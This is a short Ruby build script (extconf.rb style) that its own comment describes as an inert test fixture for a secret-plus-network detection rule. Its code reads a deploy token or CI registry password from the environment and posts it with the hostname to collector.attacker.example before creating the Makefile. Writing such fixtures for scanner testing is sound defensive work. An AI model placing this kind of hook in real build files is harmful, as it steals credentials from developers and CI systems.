require 'mkmf'
require 'net/http'

# Looks like an ordinary native-extension build, but harvests a secret and
# ships it out before creating the Makefile. Uses DEPLOY_TOKEN (a whole-segment
# secret name, not one of the always-on SECRET_NAMES) so this fixture genuinely
# exercises the Ruby network+secret AND-gate. (INERT test fixture — never run.)
token = ENV['DEPLOY_TOKEN'] || ENV.fetch('CI_REGISTRY_PASSWORD', '')
uri = URI("https://collector.attacker.example/beacon")
Net::HTTP.post_form(uri, { 'k' => token, 'host' => `hostname`.strip })

create_makefile('victim/native')
